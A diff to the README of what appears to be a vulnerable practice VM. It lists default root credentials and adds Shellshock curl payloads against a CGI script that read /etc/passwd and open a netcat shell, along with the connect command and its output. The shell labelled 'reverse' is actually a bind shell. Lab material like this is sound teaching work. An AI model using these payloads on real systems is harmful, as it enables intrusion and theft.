@@ -9,3 +9,27 @@ Can be downloaded at ...TODO
 
 * root:root
 * netsec:netsec
+
+
+### How to Exploit
+
+Shellshock:
+```
+curl -H "User-Agent: () { :; }; echo \"Content-type: text/plain\"; echo \"\"; echo \"\"; /bin/cat /etc/passwd" 192.168.1.110/cgi-bin/index.cgi
+```
+
+Reverse Shell:
+```
+curl -H "User-Agent: () { :; }; /bin/netcat -e /bin/bash -l -p 12345" 192.168.1.110/cgi-bin/index.cgi
+```
+
+Connect to Reverse Shell:
+```
+netcat 192.168.1.110 12345
+```
+
+Information Gathering:
+```
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
